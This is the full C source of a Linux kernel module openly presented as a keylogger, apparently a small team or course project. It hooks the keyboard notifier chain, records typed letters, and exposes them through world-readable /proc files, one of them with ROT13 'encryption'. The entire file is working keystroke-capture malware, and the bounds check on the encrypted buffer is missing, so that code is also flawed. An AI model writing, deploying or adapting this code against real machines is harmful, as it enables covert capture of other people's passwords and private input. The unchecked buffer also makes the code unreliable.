#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/wait.h>
#include <linux/sched.h>

#define BUFFER_SIZE 1024
#define PROC_FILE_NAME "usb_keylogger"
#define PROC_FILE_ENCRYPTED "usb_keylogger_encrypted"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Andy, Hugh, Skye");
MODULE_DESCRIPTION("A simple Linux keylogger with /proc interface");

static char key_buffer[BUFFER_SIZE];
static char encrypted_buffer[BUFFER_SIZE];
static int buffer_pos = 0;
static int encrypted_pos = 0;
static struct proc_dir_entry *proc_entry;
static struct proc_dir_entry *proc_entry_encrypted;
static wait_queue_head_t read_queue;
static wait_queue_head_t encrypted_queue;
static int data_available = 0;
static int encrypted_available = 0;

// Function to map keycodes to characters
static char keycode_to_char(int keycode) {
    // Map raw keycodes to standard keycodes
    if (keycode >= 64353 && keycode <= 64378) {
        return 'a' + (keycode - 64353); // Map keycodes to 'a' to 'z'
    }
    return '\0'; // Unknown keycode
}

// Caesar cipher encryption (ROT13)
static void caesar_cipher(char *input, char *output, int len) {
    for (int i = 0; i < len; i++) {
        if (input[i] >= 'a' && input[i] <= 'z') {
            output[i] = 'a' + (input[i] - 'a' + 13) % 26;
        } else if (input[i] >= 'A' && input[i] <= 'Z') {
            output[i] = 'A' + (input[i] - 'A' + 13) % 26;
        } else {
            output[i] = input[i]; // Non-alphabetic characters remain unchanged
        }
    }
    output[len] = '\0';
}

// Proc file read function (plaintext)
static ssize_t proc_read(struct file *file, char __user *user_buffer, size_t count, loff_t *ppos) {
    if (*ppos > 0) // Indicates that the read operation is complete
        return 0;

    if (buffer_pos == 0)
        wait_event_interruptible(read_queue, data_available);

    if (copy_to_user(user_buffer, key_buffer, buffer_pos))
        return -EFAULT;

    *ppos += buffer_pos;
    int bytes_read = buffer_pos;
    buffer_pos = 0;
    data_available = 0;
    return bytes_read;
}

// Proc file read function (encrypted)
static ssize_t proc_read_encrypted(struct file *file, char __user *user_buffer, size_t count, loff_t *ppos) {
    if (*ppos > 0) // Indicates that the read operation is complete
        return 0;

    if (encrypted_pos == 0)
        wait_event_interruptible(encrypted_queue, encrypted_available);

    if (copy_to_user(user_buffer, encrypted_buffer, encrypted_pos))
        return -EFAULT;

    *ppos += encrypted_pos;
    int bytes_read = encrypted_pos;
    encrypted_pos = 0;
    encrypted_available = 0;
    return bytes_read;
}

// Proc file operations structures
static struct proc_ops proc_fops = {
    .proc_read = proc_read,
};

static struct proc_ops proc_fops_encrypted = {
    .proc_read = proc_read_encrypted,
};

// Keyboard notifier callback
static int keyboard_callback(struct notifier_block *nblock, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) {
        char key = keycode_to_char(param->value);
        if (key != '\0' && buffer_pos < BUFFER_SIZE - 1) {
            // Log the plaintext key
            key_buffer[buffer_pos++] = key;
            key_buffer[buffer_pos] = '\0'; // Null-terminate the buffer
            data_available = 1;
            wake_up_interruptible(&read_queue);

            // Encrypt the key and log it
            caesar_cipher(&key, &encrypted_buffer[encrypted_pos], 1);
            encrypted_pos++;
            encrypted_buffer[encrypted_pos] = '\0'; // Null-terminate the buffer
            encrypted_available = 1;
            wake_up_interruptible(&encrypted_queue);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keyboard_callback
};

// Module initialization function
static int __init keylogger_init(void) {
    // Initialize wait queues
    init_waitqueue_head(&read_queue);
    init_waitqueue_head(&encrypted_queue);

    // Create /proc entries
    proc_entry = proc_create(PROC_FILE_NAME, 0444, NULL, &proc_fops);
    if (!proc_entry) {
        printk(KERN_ERR "Failed to create /proc/%s\n", PROC_FILE_NAME);
        return -ENOMEM;
    }

    proc_entry_encrypted = proc_create(PROC_FILE_ENCRYPTED, 0444, NULL, &proc_fops_encrypted);
    if (!proc_entry_encrypted) {
        printk(KERN_ERR "Failed to create /proc/%s\n", PROC_FILE_ENCRYPTED);
        proc_remove(proc_entry); // Clean up the first /proc file if the second one fails
        return -ENOMEM;
    }

    // Register keyboard notifier
    register_keyboard_notifier(&nb);

    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

// Module exit function
static void __exit keylogger_exit(void) {
    // Unregister keyboard notifier
    unregister_keyboard_notifier(&nb);

    // Remove /proc entries
    if (proc_entry) {
        proc_remove(proc_entry);
        printk(KERN_INFO "Removed /proc/%s\n", PROC_FILE_NAME);
    }
    if (proc_entry_encrypted) {
        proc_remove(proc_entry_encrypted);
        printk(KERN_INFO "Removed /proc/%s\n", PROC_FILE_ENCRYPTED);
    }

    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
